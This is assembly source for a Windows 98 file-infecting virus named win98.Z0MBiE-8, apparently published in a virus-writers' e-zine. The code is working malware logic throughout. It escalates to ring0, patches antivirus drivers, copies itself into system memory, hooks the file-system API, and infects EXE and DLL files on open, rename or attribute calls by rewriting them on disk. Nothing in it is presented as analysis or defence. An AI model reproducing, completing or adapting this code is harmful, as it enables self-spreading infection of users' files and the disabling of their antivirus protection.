   ; win98.Z0MBiE-8
   ; written for MATRiX #2 E-Zine
   ; http://z0mbie.cjb.net

   IN_GDT_BASE             equ     800h    ; vir offs in the GDT

   INFECT_MIN_SIZE         equ     8192    ; min file size
   INFECT_MAX_SIZE         equ     524288  ; max size
   INFECT_ADD_SIZE         equ     16384   ; add to size when allocating memory

   include                 macros.inc      ; some macros: vxdcall, pusho, getofs
   include                 consts.inc      ; consts
   include                 mz.inc          ; MZ header
   include                 pe.inc          ; PE header

                           p386
                           model   flat
                           locals  __

                           .data
   start:
                           retn                    ; 0C3h -- 'alredy TSR' sign

   entry:
                           call    callring0       ; enter ring0 & do bad stuff

                           db      0E9h            ; JMP back to host
   oldeip                  dd      0
                           retn                    ; need for first exec

   include                 ring0.inc               ; ring0-entering subroutine

                           ; called in ring0
   ring0:                  pusha

                           call    killavxd        ; patch AV vxds

                           getofs  esi, start              ; ESI<--old base

   ;                       push    virsize
   ;                       VxDcall IFSMGR, GetHeap
   ;                       pop     ecx                     ; ECX<--virsize
   ;                       xchg    edi, eax                ; EDI<--new base

                           call    get_gdt_base            ; EAX<--GDT.base
                           lea     edi, [eax+IN_GDT_BASE]  ; EDI<--new base
                           mov     ecx, virsize            ; ECX<--virsize

                           cmp     byte ptr [edi], 0C3h    ; alredy TSR ?
                           je      __exit

                           pusha
                           rep     movsb                   ; copy virus
                           popa

                           ; install FileSystemApiHook
                           lea     eax, [edi+ifs_handler-start]
                           push    eax
                           VxDcall IFSMGR, InstallFileSystemApiHook
                           pop     ecx
                           mov     eax, [eax]
                           mov     [edi+ifs_oldhandler-start], eax

   __exit:                 popa
                           retn

                           ; get GDT.base into EAX
   get_gdt_base:           sgdt    [esp-6]
                           mov     eax, [esp-4]
                           retn

   ifs_handler:            call    get_gdt_base
                           cmp     byte ptr [eax], 'Z'     ; check invirus-flag
                           je      ifs_quit
                           mov     byte ptr [eax], 'Z'     ; set invirus-flag

                           mov     eax, [esp]._function    ; check function

                           cmp     eax, IFSFN_OPEN
                           je      ifs_func1
                           cmp     eax, IFSFN_RENAME
                           je      ifs_func1
                           cmp     eax, IFSFN_FILEATTRIB
                           je      ifs_func1

   ifs_func1_exit:         call    get_gdt_base
                           mov     byte ptr [eax], 0       ; clear invirus-flag

   ifs_quit:               db      068h
   ifs_oldhandler          dd      ?
                           retn

   ifs_func1:              pusha
                           enter   MAXPATH,0       ; ESP = db MAXPATH dup (?)

                           mov     edi, esp
                           cld

                           mov     eax, [esp]._drive + MAXPATH+4+32
                           or      al, al
                           jle     __exit

                           add     al, 'A'-1       ; drive
                           stosb
                           mov     al, ':'         ; ':'
                           stosb
                           mov     eax, [esp]._ioreq_ptr + MAXPATH+4+32
                           mov     eax, [eax+0Ch]  ; eax <-- filename
                           add     eax, 4          ; skip "
                           push    [esp]._codepage+MAXPATH+4+32 ; BCS_WANSI/BCS_OEM
                           push    MAXPATH-1           ; max name length
                           push    eax             ; uni-str
                           push    edi             ; output-str
                           VxDcall IFSMGR, UniToBCSPath
                           add     esp, 4*4

                           or      edx, edx        ; converted normally?
                           jnz     __exit

                           mov     [edi+eax], dl   ; NUL

                           mov     eax, [edi+eax-4]
                           or      eax, 20202000h

                           cmp     eax, 'm0z.'     ; 'exe.'   [will be copiled;
                           je      __call_infect   ;           then patched]
                           cmp     eax, 'm0z.'     ; 'lld.'
                           je      __call_infect

                           jmp     __exit

   __call_infect:          mov     edx, esp
                           call    call_infect_file

   __exit:                 leave
                           popa
                           jmp     ifs_func1_exit

   ; input: EDX=file name

   call_infect_file:       pusha

                           ; easy way to check if file is opened
                           call    r0_fgetattr     ; get attribs (ECX)
                           call    r0_fsetattr     ; set attribs (ECX)
                           jc      __exit

                           call    r0_fopen_ro     ; open file in read-only mode
                           jc      __exit
                           xchg    ebx, eax

                           call    r0_fgetsize     ; get file size
                           jc      __close
                           mov     esi, eax        ; ESI = file size

                           sub     eax, INFECT_MIN_SIZE    ; check file size
                           cmp     eax, INFECT_MAX_SIZE-INFECT_MIN_SIZE
                           jae     __close

                           lea     edi, [esi+INFECT_ADD_SIZE+4095]
                           shr     edi, 12          ; EDI = # of pages

                           pusha                   ; allocate memory
                           push    PAGEFIXED + PAGEZEROINIT
                           xor     eax, eax
                           push    eax     ; PhysAddr
                           push    eax     ; maxPhys
                           push    eax     ; minPhys
                           push    eax     ; Align
                           push    eax     ; handle of VM (==0 if PG_SYS)
                           push    PG_SYS  ; flags
                           push    edi     ; nPages
                           VMMcall PageAllocate
                           add     esp, 8*4
                           mov     [esp+5*4], eax          ; popa.edx
                           or      eax, eax
                           popa
                           jz      __close

                           ; read whole file into memory
                           pusha
                           mov     ecx, esi        ; ecx=size
                           xor     esi, esi        ; esi=pos
                           call    r0_fread
                           popa

                           ; infect file in memory
                           pusha
                           push    edx                     ; EDI=fileptr
                           push    esi                     ; ESI=filesize
                           getofs  eax, start
                           push    eax                     ; virstart
                           push    virsize                 ; virsize
                           push    entry-start             ; virentry
                           push    oldeip-start            ; oldeip
                           call    infect_file
                           mov     [esp+1*4], eax  ; popa.esi == new file size
                           popa
                           jc      __skip_update

                           ; if infected, write file back to disk
                           pusha
                           call    r0_make_handle_rw       ; fuck share
                           mov     ecx, esi        ; ecx=size
                           xor     esi, esi        ; esi=pos
                           call    r0_fwrite
                           call    r0_make_handle_ro       ; restore share
                           popa

                           ; free memory
   __skip_update:          pusha
                           push    0
                           push    edx
                           VMMcall PageFree
                           pop     ecx
                           pop     ecx
                           popa

                           ; close file
   __close:                call    r0_fclose

   __exit:                 popa
                           ret

   include                 r0io.inc                ; r0 file io
   include                 infect.inc              ; infect engine
   include                 killavxd.inc            ; av vxds fuckup stuff
   include                 uncall.inc              ; vxdcall restoring

                           align   4
   virsize                 equ     $-start

           db      13,10
           db      '----------------------------',13,10
           db      'virsize = ',virsize/1000 mod 10+'0',virsize/100 mod 10+'0',virsize/10 mod 10+'0',virsize mod 10+'0',13,10
           db      '----------------------------',13,10
           db      13,10

                           end     entry
